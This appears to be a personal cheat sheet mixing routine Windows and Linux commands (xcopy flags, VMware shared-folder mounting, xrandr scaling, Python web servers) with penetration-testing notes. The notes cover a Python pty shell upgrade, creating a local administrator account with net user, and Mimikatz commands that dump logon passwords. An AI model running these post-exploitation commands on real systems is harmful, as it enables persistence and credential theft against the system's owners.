### xcopy syntax ###

```
xcopy "C:\SomeFolderName" "D:\SomeFolderName" /h /i /c /k /e /r /y
```

Copy C:\SomeFolderName to the D drive

/h copies hidden and system files also
/i if destination does not exist and copying more than one file, assume that destination must be a directory
/c continue copying even if error occurs
/k copies attributes
/e copies directories and subdirectories, including empty ones
/r overwrites read-only files
/y suppress prompting to confirm whether you want to overwrite a file
/z Copies over a network in restartable mode.

### Linux VM - Mounting a Windows Share - Script ###
Simple Version:
```
sudo /usr/bin/vmhgfs-fuse .host:/ /mnt/hgfs -o subtype=vmhgfs-fuse,allow_other,nonempty
```
Slightly Better Version:
```
#!/bin/bash

vmware-hgfsclient | while read folder; do
  echo "[i] Mounting ${folder}   (/mnt/hgfs/${folder})"
  mkdir -p "/mnt/hgfs/${folder}"
  umount -f "/mnt/hgfs/${folder}" 2>/dev/null
  vmhgfs-fuse -o allow_other -o auto_unmount ".host:/${folder}" "/mnt/hgfs/${folder}"
done

sleep 2s
```

### Adjusting the Scale ###

Find out the name of the screen 

> xrandr | grep connected | grep -v disconnected | awk '{print $1}'

Zoom in by 20%
> xrandr --output screen-name --scale 0.8x0.8

Zoom out by 20%
> xrandr --output screen-name --scale 1.2x1.2

Reset xrandr
> xrandr --output screen-name --scale 1x1

### Simple Web Servers

>python3 -m http.server

>python -m SimpleHTTPServer 80


### Shell Upgrade!

>python -c "import pty; pty.spawn('/bin/bash')"

>/bin/bash -i


### Post Exploitation

Add new user and add to local admin group

> net user gary password /add

> net localgroup administrators gary /add



## Get Passwords

> privilege::debug

> sekurlsa::logonpasswords

## Set GB keyboard in Linux
> setxkbmap -layout gb
